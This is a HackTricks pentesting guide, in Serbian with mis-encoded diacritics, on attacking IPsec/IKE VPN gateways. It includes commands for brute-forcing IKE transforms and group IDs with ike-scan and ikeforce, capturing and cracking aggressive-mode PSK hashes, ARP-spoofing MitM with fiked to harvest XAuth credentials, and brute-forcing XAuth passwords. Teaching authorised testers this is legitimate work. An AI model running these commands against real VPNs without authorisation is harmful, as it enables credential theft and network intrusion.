# 500/udp - Pentesting IPsec/IKE VPN

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## Osnovne informacije

**IPsec** je Å¡iroko prepoznat kao glavna tehnologija za obezbeÄ‘ivanje komunikacija izmeÄ‘u mreÅ¾a (LAN-to-LAN) i od udaljenih korisnika do mreÅ¾nog prolaza (udaljeni pristup), sluÅ¾eÄ‡i kao osnovna infrastruktura za reÅ¡enja VPN za preduzeÄ‡a.

Usmeravanje **bezbednosne asocijacije (SA)** izmeÄ‘u dva mesta upravlja **IKE**, koji funkcioniÅ¡e pod okriljem ISAKMP, protokola dizajniranog za autentifikaciju i razmenu kljuÄeva. Ovaj proces se odvija u nekoliko faza:

* **Faza 1:** Stvara se siguran kanal izmeÄ‘u dva krajnja taÄke. To se postiÅ¾e koriÅ¡Ä‡enjem Pre-Shared KljuÄa (PSK) ili sertifikata, koristeÄ‡i ili glavni reÅ¾im, koji ukljuÄuje tri para poruka, ili **agresivni reÅ¾im**.
* **Faza 1.5:** Iako nije obavezna, ova faza, poznata kao Faza proÅ¡irene autentifikacije, verifikuje identitet korisnika koji pokuÅ¡ava da se poveÅ¾e zahtevajuÄ‡i korisniÄko ime i lozinku.
* **Faza 2:** Ova faza je posveÄ‡ena pregovorima o parametrima za obezbeÄ‘ivanje podataka sa **ESP** i **AH**. OmoguÄ‡ava koriÅ¡Ä‡enje algoritama razliÄitih od onih u Fazi 1 kako bi se osigurala **Perfect Forward Secrecy (PFS)**, poboljÅ¡avajuÄ‡i bezbednost.

**Podrazumevani port:** 500/udp

## **Otkrijte** uslugu koristeÄ‡i nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **PronalaÅ¾enje validne transformacije**

IPSec konfiguracija moÅ¾e biti pripremljena da prihvati samo jednu ili nekoliko transformacija. Transformacija je kombinacija vrednosti. **Svaka transformacija** sadrÅ¾i niz atributa kao Å¡to su DES ili 3DES kao **algoritam enkripcije**, SHA ili MD5 kao **algoritam integriteta**, pre-shared key kao **tip autentifikacije**, Diffie-Hellman 1 ili 2 kao **algoritam distribucije kljuÄeva** i 28800 sekundi kao **vreme trajanja**.

Dakle, prva stvar koju treba da uradite je da **pronaÄ‘ete validnu transformaciju**, kako bi server mogao da komunicira sa vama. Da biste to uradili, moÅ¾ete koristiti alat **ike-scan**. Po defaultu, Ike-scan radi u glavnom reÅ¾imu i Å¡alje paket ka gateway-u sa ISAKMP header-om i jednim predlogom sa **osam transformacija unutar njega**.

U zavisnosti od odgovora, moÅ¾ete dobiti neke informacije o krajnjoj taÄki:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Kao Å¡to moÅ¾ete videti u prethodnom odgovoru, postoji polje pod nazivom **AUTH** sa vrednoÅ¡Ä‡u **PSK**. To znaÄi da je VPN konfigurisan koristeÄ‡i prethodno podeljeni kljuÄ (i to je zaista dobro za pentestera).\
**Vrednost poslednje linije je takoÄ‘e veoma vaÅ¾na:**

* _0 vraÄ‡en handshake; 0 vraÄ‡en notify:_ To znaÄi da cilj **nije IPsec gateway**.
* _**1 vraÄ‡en handshake; 0 vraÄ‡en notify:**_ To znaÄi da je **cilj konfigurisan za IPsec i spreman je da izvrÅ¡i IKE pregovaranje, i jedan ili viÅ¡e transformacija koje ste predloÅ¾ili su prihvatljive** (vaÅ¾a transformacija Ä‡e biti prikazana u izlazu).
* _0 vraÄ‡en handshake; 1 vraÄ‡en notify:_ VPN gateway-i odgovaraju sa notify porukom kada **nijedna od transformacija nije prihvatljiva** (iako neki gateway-i to ne rade, u tom sluÄaju treba pokuÅ¡ati dalju analizu i revidirani predlog).

Dakle, u ovom sluÄaju veÄ‡ imamo vaÅ¾eÄ‡u transformaciju, ali ako ste u 3. sluÄaju, onda treba da **brute-force-ujete malo da pronaÄ‘ete vaÅ¾eÄ‡u transformaciju:**

Prvo Å¡to treba da uradite je da kreirate sve moguÄ‡e transformacije:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
I zatim izvrÅ¡ite brute-force na svakom koristeÄ‡i ike-scan (ovo moÅ¾e potrajati nekoliko minuta):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Ako brute-force nije uspeo, moÅ¾da server odgovara bez rukovanja Äak i na vaÅ¾eÄ‡e transformacije. Tada moÅ¾ete pokuÅ¡ati isti brute-force, ali koristeÄ‡i agresivni reÅ¾im:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Nadamo se da Ä‡e **vaÅ¾eÄ‡a transformacija biti vraÄ‡ena**.\
MoÅ¾ete pokuÅ¡ati **istu napad** koristeÄ‡i [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
TakoÄ‘e moÅ¾ete pokuÅ¡ati da brute force-ujete transformacije sa [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

U **DH grupi: 14 = 2048-bit MODP** i **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (u ovom sluÄaju). Format `--trans` je $Enc,$Hash,$Auth,$DH**

Cisco ukazuje da se izbegava koriÅ¡Ä‡enje DH grupa 1 i 2 jer nisu dovoljno jake. StruÄnjaci veruju da **zemlje sa mnogo resursa lako mogu da provale enkripciju** podataka koji koriste ove slabe grupe. To se radi koriÅ¡Ä‡enjem posebne metode koja ih priprema da brzo razbiju kodove. Iako postavljanje ove metode koÅ¡ta mnogo novca, omoguÄ‡ava ovim moÄ‡nim zemljama da Äitaju enkriptovane podatke u realnom vremenu ako koriste grupu koja nije jaka (kao Å¡to je 1,024-bit ili manja).

### Fingerprinting servera

Zatim, moÅ¾ete koristiti ike-scan da pokuÅ¡ate da **otkrijete dobavljaÄa** ureÄ‘aja. Alat Å¡alje inicijalni predlog i prestaje da ponavlja. Zatim Ä‡e **analizirati** razliku u **vremenu** **izmeÄ‘u** primljenih **poruka** sa servera i odgovarajuÄ‡eg obrasca odgovora, pentester moÅ¾e uspeÅ¡no da identifikuje dobavljaÄa VPN prolaza. Å taviÅ¡e, neki VPN serveri Ä‡e koristiti opcioni **Vendor ID (VID) payload** sa IKE.

**Specifikujte vaÅ¾eÄ‡u transformaciju ako je potrebno** (koristeÄ‡i --trans)

Ako IKE otkrije koji je dobavljaÄ, odÅ¡tampace to:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Ovo se takoÄ‘e moÅ¾e postiÄ‡i sa nmap skriptom _**ike-version**_

## PronalaÅ¾enje ispravnog ID-a (imena grupe)

Da biste bili u moguÄ‡nosti da uhvatite hash, potrebna vam je vaÅ¾eÄ‡a transformacija koja podrÅ¾ava Agresivni reÅ¾im i ispravan ID (ime grupe). Verovatno neÄ‡ete znati vaÅ¾eÄ‡e ime grupe, pa Ä‡ete morati da ga brute-forcujete.\
Da biste to uradili, preporuÄujem vam 2 metode:

### Bruteforcing ID sa ike-scan

Prvo pokuÅ¡ajte da poÅ¡aljete zahtev sa laÅ¾nim ID-jem pokuÅ¡avajuÄ‡i da prikupite hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Ako **nema hash-a**, onda verovatno ova metoda brute-forcing-a Ä‡e raditi. **Ako se neki hash vrati, to znaÄi da Ä‡e laÅ¾ni hash biti poslat za laÅ¾ni ID, tako da ova metoda neÄ‡e biti pouzdana** za brute-force ID. Na primer, laÅ¾ni hash bi mogao biti vraÄ‡en (to se deÅ¡ava u modernim verzijama):

![](<../.gitbook/assets/image (917).png>)

Ali ako, kao Å¡to sam rekao, nema hash-a, onda bi trebalo da pokuÅ¡ate da brute-force-ujete uobiÄajena imena grupa koristeÄ‡i ike-scan.

Ovaj skript **Ä‡e pokuÅ¡ati da brute-force-uje moguÄ‡e ID-e** i vratiÄ‡e ID-e gde je vraÄ‡en validan handshake (to Ä‡e biti validno ime grupe).

Ako ste otkrili specifiÄnu transformaciju, dodajte je u ike-scan komandu. A ako ste otkrili nekoliko transformacija, slobodno dodajte novu petlju da ih sve isprobate (trebalo bi da ih isprobate sve dok jedna od njih ne radi ispravno).

MoÅ¾ete koristiti [reÄnik ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ili [onaj u seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) sa uobiÄajenim imenima grupa da ih brute-force-ujete:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (is a combination of the other 2 dicts without repetitions):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Bruteforcing ID with Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) takoÄ‘e koristi **ike-scan** za bruteforce moguÄ‡ih imena grupa. Prati svoju metodu da **pronaÄ‘e vaÅ¾eÄ‡i ID na osnovu izlaza ike-scan**.

### Bruteforcing ID with ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) je alat koji se moÅ¾e koristiti za **bruteforce ID-eva takoÄ‘e**. Ovaj alat Ä‡e **pokuÅ¡ati da iskoristi razliÄite ranjivosti** koje bi mogle biti koriÅ¡Ä‡ene da **razlikuju vaÅ¾eÄ‡i i nevaÅ¾eÄ‡i ID** (mogu imati laÅ¾ne pozitivne i laÅ¾ne negativne rezultate, zato preferiram da koristim metodu ike-scan ako je moguÄ‡e).

Podrazumevano **ikeforce** Ä‡e na poÄetku poslati neke nasumiÄne id-ove da proveri ponaÅ¡anje servera i odredi taktiku koja Ä‡e se koristiti.

* **Prva metoda** je da se bruteforce imena grupa tako Å¡to se **traÅ¾i** informacija **Dead Peer Detection DPD** Cisco sistema (ove informacije server ponovo Å¡alje samo ako je ime grupe taÄno).
* **Druga metoda** koja je dostupna je da **proverava broj odgovora poslatih na svaki pokuÅ¡aj** jer se ponekad Å¡alje viÅ¡e paketa kada se koristi taÄan id.
* **TreÄ‡a metoda** se sastoji u **traÅ¾enju "INVALID-ID-INFORMATION" kao odgovor na neispravan ID**.
* Na kraju, ako server ne odgovara na provere, **ikeforce** Ä‡e pokuÅ¡ati da bruteforce-uje server i proveri da li kada se poÅ¡alje taÄan id server odgovara nekim paketom.\
OÄigledno, cilj bruteforce-a id-a je da se dobije **PSK** kada imate vaÅ¾eÄ‡i id. Zatim, sa **id** i **PSK** moraÄ‡ete da bruteforce-ujete XAUTH (ako je omoguÄ‡en).

Ako ste otkrili specifiÄnu transformaciju, dodajte je u ikeforce komandu. A ako ste otkrili nekoliko transformacija, slobodno dodajte novu petlju da ih sve isprobate (trebalo bi da ih isprobate sve dok jedna od njih ne funkcioniÅ¡e ispravno).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): TakoÄ‘e je moguÄ‡e dobiti vaÅ¾eÄ‡e korisniÄke nazive presretanjem veze izmeÄ‘u VPN klijenta i servera, jer je prvi paket agresivnog moda koji sadrÅ¾i ID klijenta poslat u Äistom obliku.

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

Na kraju, ako ste pronaÅ¡li **vaÅ¾eÄ‡u transformaciju** i **ime grupe** i ako je **agresivni mod dozvoljen**, onda moÅ¾ete vrlo lako uhvatiti hash koji se moÅ¾e probiti:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash Ä‡e biti saÄuvan unutar _hash.txt_.

MoÅ¾ete koristiti **psk-crack**, **john** (koristeÄ‡i [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) i **hashcat** da **crack**-ujete hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Agresivni naÄin IKE** u kombinaciji sa **Pre-Shared Key (PSK)** se Äesto koristi za **grupnu autentifikaciju**. Ova metoda je pojaÄana sa **XAuth (ProÅ¡irena autentifikacija)**, koja sluÅ¾i da uvede dodatni sloj **autentifikacije korisnika**. Takva autentifikacija obiÄno koristi usluge kao Å¡to su **Microsoft Active Directory**, **RADIUS**, ili sliÄni sistemi.

Prelazak na **IKEv2** donosi znaÄajnu promenu gde se **EAP (ProÅ¡irivi protokol autentifikacije)** koristi umesto **XAuth** za autentifikaciju korisnika. Ova promena naglaÅ¡ava evoluciju u praksama autentifikacije unutar sigurnih komunikacionih protokola.

### Lokalna mreÅ¾a MitM za hvatanje kredencijala

Tako moÅ¾ete uhvatiti podatke o prijavljivanju koristeÄ‡i _fiked_ i videti da li postoji neki podrazumevani korisniÄki naziv (Morate preusmeriti IKE saobraÄ‡aj na `fiked` za snimanje, Å¡to se moÅ¾e uraditi uz pomoÄ‡ ARP spoofinga, [viÅ¡e informacija](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked Ä‡e delovati kao VPN krajnja taÄka i uhvatiÄ‡e XAuth kredencijale:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
TakoÄ‘e, koristeÄ‡i IPSec pokuÅ¡ajte da izvrÅ¡ite MitM napad i blokirate sav saobraÄ‡aj ka portu 500, ako IPSec tunel ne moÅ¾e da se uspostavi, moÅ¾da Ä‡e saobraÄ‡aj biti poslat u Äistom obliku.

### Brute-forcing XAUTH korisniÄko ime i lozinku sa ikeforce

Da biste brute-forcovali **XAUTH** (kada znate vaÅ¾eÄ‡e ime grupe **id** i **psk**) moÅ¾ete koristiti korisniÄko ime ili listu korisniÄkih imena i listu lozinki:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Na ovaj naÄin, ikeforce Ä‡e pokuÅ¡ati da se poveÅ¾e koristeÄ‡i svaku kombinaciju korisniÄkog imena:lozinke.

Ako ste pronaÅ¡li jednu ili viÅ¡e validnih transformacija, jednostavno ih koristite kao u prethodnim koracima.

## Autentifikacija sa IPSEC VPN-om

U Kali, **VPNC** se koristi za uspostavljanje IPsec tunela. **Profili** moraju biti smeÅ¡teni u direktorijumu `/etc/vpnc/`. MoÅ¾ete pokrenuti ove profile koristeÄ‡i komandu _**vpnc**_.

SledeÄ‡e komande i konfiguracije ilustruju proces postavljanja VPN veze sa VPNC:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
U ovoj konfiguraciji:

* Zamenite `[VPN_GATEWAY_IP]` sa stvarnom IP adresom VPN prolaza.
* Zamenite `[VPN_CONNECTION_ID]` sa identifikatorom za VPN vezu.
* Zamenite `[VPN_GROUP_SECRET]` sa grupnom tajnom VPN-a.
* Zamenite `[VPN_USERNAME]` i `[VPN_PASSWORD]` sa autentifikacionim podacima za VPN.
* `[PID]` simbolizuje ID procesa koji Ä‡e biti dodeljen kada `vpnc` inicira.

Osigurajte da se koriste stvarne, sigurne vrednosti za zamenu mesta kada konfiguriÅ¡ete VPN.

## Referentni materijal

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
